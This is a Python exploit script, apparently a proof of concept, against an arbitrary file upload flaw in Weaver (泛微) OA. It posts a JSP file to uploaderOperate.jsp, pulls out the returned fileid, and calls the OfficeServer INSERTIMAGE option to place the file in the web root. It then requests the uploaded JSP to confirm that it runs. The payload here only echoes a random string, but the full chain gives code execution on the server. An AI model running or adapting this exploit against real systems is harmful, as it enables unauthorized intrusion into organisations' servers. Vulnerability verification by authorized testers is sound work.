#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import random
import string
import sys
import base64


def generate_random_string(length=5):
    """生成随机字符串"""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def verify(target_url):
    """
    检测泛微 OA workrelate/plan/util/uploaderOperate.jsp 接口的任意文件上传漏洞
    :param target_url: 目标 URL（例如：http://example.com）
    """
    try:
        # 生成随机文件名和字符串
        filename = generate_random_string()
        random_string = generate_random_string(10)

        # 构造请求 URL 和文件路径
        upload_url = f"{target_url}/workrelate/plan/util/uploaderOperate.jsp"
        file_url = f"{target_url}/{filename}.jsp"

        # 请求头
        headers = {
            "Host": target_url.split("//")[1].split("/")[0],
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36",
            "Accept": "*/*",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj",
            "Accept-Encoding": "gzip",
        }

        # 请求体
        body = (
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\n"
            'Content-Disposition: form-data; name="secId"\r\n\r\n'
            "1\r\n"
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\n"
            f'Content-Disposition: form-data; name="Filedata"; filename="{filename}.jsp"\r\n\r\n'
            f"<%out.println('{random_string}');%>\r\n"
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\n"
            'Content-Disposition: form-data; name="plandetailid"\r\n\r\n'
            "1\r\n"
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj--\r\n"
        )

        # 发送 POST 请求上传文件
        print(f"[*] Uploading file to: {upload_url}")
        response_upload = requests.post(upload_url, headers=headers, data=body, timeout=10)
        print(f"[*] Upload response status code: {response_upload.status_code}")

        # 提取 fileid
        fileid = None
        if response_upload.status_code == 200 and "workrelate/plan/util/ViewDoc" in response_upload.text:
            print("[+] File uploaded successfully.")
            # 假设 fileid 在响应中可以通过正则提取
            import re
            match = re.search(r"&fileid=(.*?)'>", response_upload.text)
            if match:
                fileid = match.group(1)
                print(f"[+] Extracted fileid: {fileid}")
            else:
                print("[-] Failed to extract fileid.")
        else:
            print("[-] File upload failed.")
            return

        # 发送 POST 请求插入图片
        insert_url = f"{target_url}/OfficeServer"
        insert_body = (
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\n"
            'Content-Disposition: form-data; name="aaa"\r\n\r\n'
            f'{{"OPTION":"INSERTIMAGE","isInsertImageNew":"1","imagefileid4pic":"{fileid}"}}\r\n'
            "------WebKitFormBoundaryVdb2RRl25PuaGhWj--\r\n"
        )
        print(f"[*] Inserting image with fileid: {fileid}")
        response_insert = requests.post(insert_url, headers=headers, data=insert_body, timeout=10)
        print(f"[*] Insert response status code: {response_insert.status_code}")

        # 发送 GET 请求访问上传的文件
        print(f"[*] Accessing file at: {file_url}")
        response_file = requests.get(file_url, headers=headers, timeout=10)
        print(f"[*] File access response status code: {response_file.status_code}")

        # 检查漏洞是否存在
        if response_file.status_code == 200 and random_string in response_file.text:
            print("[+] Vulnerability detected! File uploaded and accessed successfully.")
            return file_url
        else:
            print("[-] No vulnerability detected.")

    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
    return False
if __name__=="__main__":
    target = sys.argv[1]
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的图片路径为：", data)
    else:
        print("[-]漏洞不存在")
